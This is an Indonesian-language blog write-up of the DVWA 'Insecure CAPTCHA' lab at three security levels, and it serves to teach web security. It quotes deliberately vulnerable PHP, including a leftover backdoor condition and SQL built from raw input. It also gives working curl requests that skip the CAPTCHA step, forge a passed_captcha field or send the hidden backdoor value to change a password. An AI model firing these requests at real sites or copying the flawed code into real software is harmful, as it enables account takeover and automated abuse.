---
title: "INSECURE RECAPTCHA"
date: 2026-02-05 00:00:00
categories: [Pentest, Web Security]
tags: [reCAPTCHA, Cyber Security, Red Team, DVWA]
---

## **PENJELASAN INSECURE RECAPTCHA**

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image1.png)

**CAPTCHA** (*Completely Automated Public Turing test to tell Computers and Humans Apart*) adalah mekanisme keamanan yang dirancang untuk membedakan antara pengguna manusia dan program otomatis (bot). CAPTCHA umumnya ditemukan pada halaman login, registrasi akun, formulir kontak, dan fitur publik lainnya.

Meskipun dirancang untuk menghalangi otomatisasi, implementasi reCAPTCHA yang tidak tepat justru dapat membuka celah bypass. Beberapa kesalahan implementasi yang umum ditemukan:

- Validasi CAPTCHA dilakukan **sepenuhnya di sisi klien (client-side)** sehingga mudah dimanipulasi.
- Proses verifikasi **terpisah dari alur utama** tanpa validasi ulang di tahap kritis.
- Tidak ada mekanisme **state/session** untuk menandai bahwa CAPTCHA telah dilalui.
- Terdapat **backdoor atau development code** yang tertinggal di lingkungan production.

Dampak dari kerentanan ini cukup luas, terutama untuk mendukung serangan otomatis (bot) seperti:

- **Brute force** kredensial
- **Web scraping** atau pencurian data
- **Pembuatan akun masal (account enumeration)**
- **Penghabisan resource server** (CPU, RAM, bandwidth)
- **Denial of Service (DoS)**

---

## **PERCOBAAN SERANGAN DI DVWA**

**DVWA** (*Damn Vulnerable Web Application*) menyediakan modul **Insecure CAPTCHA** dengan empat level keamanan. Skenario yang digunakan adalah mengganti password pengguna secara otomatis tanpa menyelesaikan tantangan CAPTCHA.

![Ilustrasi Form Change Password](/assets/2026-02-10-Insecure-recaptcha/image4.png)

---

### **Level Low — Pemisahan Step Tanpa Validasi**

Pada level **Low**, implementasi CAPTCHA memisahkan proses menjadi dua tahap:

**Step 1**: Validasi CAPTCHA  
**Step 2**: Proses perubahan password

Sayangnya, **tidak ada pengecekan di step 2** apakah user benar-benar telah melewati step 1. Parameter `step` juga dikirim melalui POST sehingga mudah dimanipulasi.

**Kode rentan (Step 2):**
```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];
    
    if( $pass_new == $pass_conf ) {
        // Update password langsung!
        $insert = "UPDATE `users` SET password = '$pass_new' ...";
    }
}
```

**Eksploitasi dengan cURL:**
```bash
curl 'http://localhost/dvwa/vulnerabilities/captcha/' \
  -H 'Cookie: PHPSESSID=YOUR_SESSION_ID; security=low' \
  -d 'step=2&password_new=hacked456&password_conf=hacked456&Change=Change'
```

Hasilnya, password berhasil diubah tanpa melalui CAPTCHA.

![Respons Password Changed](/assets/2026-02-10-Insecure-recaptcha/image5.png)  
![Validasi Login](/assets/2026-02-10-Insecure-recaptcha/image6.png)

---

### **Level Medium — Hidden Field Passed_CAPTCHA**

Level **Medium** mencoba "memperbaiki" dengan menambahkan **hidden field `passed_captcha`** pada form step 2. Namun, karena tidak ada mekanisme session, parameter ini tetap dapat dimanipulasi sepenuhnya oleh client.

**Validasi di server:**
```php
if( !$_POST[ 'passed_captcha' ] ) {
    $html .= "<pre><br />You have not passed the CAPTCHA.</pre>";
    $hide_form = false;
    return;
}
```

**Eksploitasi:**
Penyerang cukup menambahkan parameter `passed_captcha=true` ke dalam request.

```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' \
  -H 'Cookie: PHPSESSID=SESSION_ID_KAMU; security=medium' \
  -d 'step=2&password_new=hacked999&password_conf=hacked999&passed_captcha=true&Change=Change'
```

![Eksploitasi Level Medium](/assets/2026-02-10-Insecure-recaptcha/image2.png)  
![Password Berhasil Diubah](/assets/2026-02-10-Insecure-recaptcha/image3.png)

---

### **Level High — Backdoor Development Code**

Level **High** menunjukkan kesalahan klasik: **development code yang tidak dihapus**. Terdapat kondisi **OR** yang memungkinkan bypass jika salah satu kondisi terpenuhi.

**Cuplikan kode:**
```php
$resp = recaptcha_check_answer(...);

if (
    $resp || 
    (
        $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
        && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
    )
) {
    // CAPTCHA dianggap benar
    // Update password...
}
```

Artinya, penyerang **tidak perlu menyelesaikan CAPTCHA** selama ia mengirim:
- `g-recaptcha-response = hidd3n_valu3`
- `User-Agent: reCAPTCHA`

**Eksploitasi:**
```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' \
  -H 'User-Agent: reCAPTCHA' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=SESSION_ID_USER; security=high' \
  --data 'step=2&password_new=hackedeuy&password_conf=hackedeuy&g-recaptcha-response=hidd3n_valu3&Change=Change'
```

![Bypass dengan Backdoor](/assets/2026-02-10-Insecure-recaptcha/image7.png)  
![Sukses Ganti Password](/assets/2026-02-10-Insecure-recaptcha/image8.png)

---

## **KESIMPULAN**

jadi bukan reCAPTCHA-nya yang tidak aman, tapi implementasinya kudu bener